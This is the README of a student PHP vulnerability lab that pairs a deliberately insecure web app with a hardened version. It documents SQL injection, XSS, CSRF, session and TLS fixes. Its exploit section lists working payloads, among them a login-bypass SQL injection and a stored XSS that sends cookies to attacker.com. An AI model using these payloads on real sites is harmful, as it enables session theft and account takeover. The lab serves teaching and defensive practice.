[README_main.md](https://github.com/user-attachments/files/25620191/README_main.md)
#  PHP Vulnerability Lab — Insecure vs Secure

> A full-stack PHP web application built and broken on purpose — then fully hardened.  
> Built as part of a Secure Programming module to demonstrate real-world vulnerability exploitation and remediation.

---

## What This Is

This repo contains **two complete versions** of the same PHP web application:

| Version | Description |
|---------|-------------|
| [`/insecure`](./insecure/) | Intentionally vulnerable app — raw SQL, no encoding, plaintext passwords, no CSRF |
| [`/secure`](./secure/) | Fully hardened version — every vulnerability identified, exploited, and fixed |

The goal was to build something deliberately broken, prove each vulnerability works with a working exploit, then systematically eliminate every one.

---

## Vulnerabilities Demonstrated & Fixed

| # | Vulnerability | Severity | File | Status |
|---|--------------|----------|------|--------|
| 1 | SQL Injection (Login bypass) |  CRITICAL | `index.php` |  Fixed |
| 2 | SQL Injection (Register INSERT) |  CRITICAL | `register.php` |  Fixed |
| 3 | Stored XSS |  HIGH | `welcome.php` |  Fixed |
| 4 | Reflected XSS (email field) |  HIGH | `index.php` |  Fixed |
| 5 | DOM-Based XSS |  HIGH | `welcome.php` |  Fixed |
| 6 | Reflected XSS (?test param) |  HIGH | `welcome.php` |  Fixed |
| 7 | Plaintext Password Storage |  CRITICAL | `register.php` |  Fixed |
| 8 | No CSRF Protection |  HIGH | All forms |  Fixed |
| 9 | Session Fixation |  HIGH | All pages |  Fixed |
| 10 | Insecure Cookie Flags |  HIGH | `php.ini` |  Fixed |
| 11 | Hardcoded DB Credentials |  MEDIUM | `config.php` |  Fixed |
| 12 | Weak TLS Configuration |  HIGH | `httpd-ssl.conf` |  Fixed |
| 13 | IDOR (demonstrated) |  MEDIUM | `demo.php` |  Documented |
| 14 | OTP Always 999999 (rand bug) |  HIGH | `controllerUserData.php` |  Fixed |
| 15 | env_loader strpos bug |  LOW | `env_loader.php` |  Fixed |

---

## Tech Stack

```
Backend     PHP 8.2
Database    MySQL / MariaDB (XAMPP)
Server      Apache 2.4 + mod_ssl
Auth        Session-based + Google OAuth 2.0
Crypto      bcrypt (PASSWORD_BCRYPT), TLS 1.3
Security    CSRF tokens, HSTS, httponly cookies, .env secrets
```

---

## Key Security Features (Secure Version)

###  Authentication
- Email/password login with **bcrypt** password hashing
- **Google OAuth 2.0** — full token exchange flow, auto-links by email
- **reCAPTCHA v2** server-side verification on login
- `session_regenerate_id(true)` on every successful login

###  Input Handling
- All SQL queries use **prepared statements** (`mysqli_prepare` + `bind_param`)
- All output encoded with `htmlspecialchars()` — XSS impossible from DB data
- Input length limits on all form fields (100/1000 chars)
- Username validated against `/^[a-zA-Z0-9_]+$/`

###  CSRF Protection
- Custom `csrf.php` library — `csrf_token()` + `csrf_validate()`
- Token comparison via `hash_equals()` — timing-attack resistant

###  Session Security
```ini
session.cookie_secure     = On
session.cookie_httponly   = On
session.cookie_samesite   = Strict
session.use_strict_mode   = 1
```

### 📡 Transport Security
- TLS 1.2 + 1.3 only (1.0 and 1.1 disabled)
- HSTS header: `max-age=31536000`
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`

### Secrets Management
- All credentials in `.env` outside the web root
- Loaded via `env_loader.php` — `strpos() === false` bug fixed

---

## Exploit Demonstrations

The [`/insecure`](./insecure/) folder includes `demo.php` with **live working exploits**:

```
SQL Injection login bypass:
  Email:    admin' -- -
  Password: anything

Stored XSS (post in comments):
  <script>document.location='https://attacker.com/steal?c='+document.cookie</script>

Reflected XSS via URL:
  /index.php?email="><script>alert(document.cookie)</script>

DOM-Based XSS (Quick Search input):
  <img src=x onerror=alert('DOM XSS!')>

Reflected XSS via GET param:
  /welcome.php?test=<script>alert(1)</script>
```

---

## Project Structure

```
php-vuln-lab/
│
├── README.md                  ← You are here
│
├── insecure/                  ← Vulnerable version
│   ├── README.md              ← Vulnerability writeup
│   ├── index.php              ← Raw SQL login
│   ├── register.php           ← Plaintext password storage
│   ├── welcome.php            ← Stored + DOM + Reflected XSS
│   ├── config.php             ← Hardcoded credentials
│   ├── logout.php
│   └── demo.php               ← Proof-of-concept exploits
│
└── secure/                    ← Hardened version
    ├── README.md              ← Security implementation writeup
    ├── index.php              ← CSRF + reCAPTCHA + prepared stmts
    ├── login.php              ← Google OAuth 2.0
    ├── register.php           ← BCrypt + validation + CSRF
    ├── welcome.php            ← Escaped output + prepared stmts
    ├── profile.php            ← Account management
    ├── logout.php             ← Full session destruction
    ├── navbar.php             ← Shared nav component
    ├── config.php             ← Loads from .env
    ├── csrf.php               ← Token library
    ├── env_loader.php         ← .env parser (strpos bug fixed)
    ├── controllerUserData.php ← OTP password reset flow
    ├── mailer.php
    ├── httpd-ssl.conf         ← Apache TLS hardening
    └── php.ini                ← PHP security hardening
```

---

## Standards & Frameworks Applied

- **OWASP Top 10 (2021)** — A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A05 Security Misconfiguration, A07 Authentication Failures
- **STRIDE** — Spoofing, Tampering, Information Disclosure all modelled and mitigated
- **CERT Secure Coding** — IDS00 (SQL injection), IDS51 (XSS), MSC02 (random numbers)
- **Microsoft SDL** — Security applied at every SDLC phase

---

## How to Run

### Insecure Version (for demo/testing only)
```bash
# Requires XAMPP
1. Copy /insecure to C:\xampp\htdocs\vuln-demo\
2. Import database schema from /insecure/db/schema.sql
3. Visit http://localhost/vuln-demo/
4. Open demo.php to run exploits
```

### Secure Version
```bash
1. Copy /secure to C:\xampp\htdocs\cw2-secure\
2. Create .env at C:\xampp\htdocs\.env (see .env.example)
3. Enable SSL in httpd.conf and configure httpd-ssl.conf
4. Import database from /secure/db/schema.sql
5. Visit https://localhost/cw2-secure/
```

---

## .env.example

```env
DB_HOST=localhost
DB_USER=root
DB_PASS=yourpassword
DB_NAME=cw2_secure
GOOGLE_CLIENT_ID=your_client_id
GOOGLE_CLIENT_SECRET=your_client_secret
GOOGLE_REDIRECT_URI=https://localhost/cw2-secure/login.php
RECAPTCHA_SITE_KEY=your_site_key
RECAPTCHA_SECRET=your_secret
```

---

## Skills Demonstrated

```
Vulnerability Assessment    SQL Injection, XSS (Stored/Reflected/DOM), CSRF, IDOR, Session Attacks
Secure Development          Prepared Statements, Output Encoding, CSRF Tokens, BCrypt, .env Secrets
Applied Cryptography        BCrypt password hashing, TLS 1.3, CSRF token via random_bytes()
Authentication              Session-based auth, Google OAuth 2.0 token exchange flow
Server Hardening            Apache SSL config, PHP ini hardening, TLS protocol restriction
Code Analysis               Static review, dynamic testing, proof-of-concept exploit development
```

---

